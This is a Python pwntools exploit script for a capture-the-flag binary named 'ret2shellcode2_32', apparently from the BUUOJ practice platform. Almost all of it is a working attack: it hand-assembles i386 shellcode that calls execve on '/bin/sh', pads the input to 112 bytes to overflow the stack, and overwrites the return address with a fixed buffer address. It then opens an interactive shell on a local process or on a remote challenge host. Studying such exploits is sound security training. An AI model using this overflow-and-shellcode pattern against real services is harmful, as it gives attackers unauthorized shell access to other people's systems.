#!/usr/bin/env python
# -*- encoding: utf-8 -*-
'''
@File    :   exp.py
@Time    :   2021/07/27 21:44:28
@Author  :   eur1ka  
@Version :   2.7
@Contact :   eur1ka@163.com
'''
# here put the import lib
from pwn import *
from LibcSearcher import *
import pwnlib
debug = 1
context.log_level = 'debug'
context.arch = 'i386'
if debug:
    sh = process('./ret2shellcode2_32')
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
    one_offset = [0x45226,0x4527a,0xf03a4,0xf1247]
else:
    IP = 'node3.buuoj.cn'
    port = 1
    sh = remote(IP,port)
    libc = ELF('/home/eur1ka/Desktop/Pwn/libc_file/16-64-libc-2.23.so')
    one_offset = [0x45216,0x4526a,0xf02a4,0xf1147]
elf = ELF('./ret2shellcode2_32')
def debug():
    gdb.attach(sh)
    pause()


payload = asm("push 0x68")
payload += asm("push 0x732f2f2f")
payload += asm("push 0x6e69622f  ")
payload += asm("mov ebx,esp")
payload += asm("xor ecx,ecx")
payload += asm("xor edx,edx")
payload += asm("push 11")
payload += asm("pop eax")
# payload += asm("mov eax 11")
payload += asm("int 0x80")


payload = payload.ljust(112,'a')
payload += p32(0x0804A080)
# debug()
sh.sendline(payload)
sh.interactive()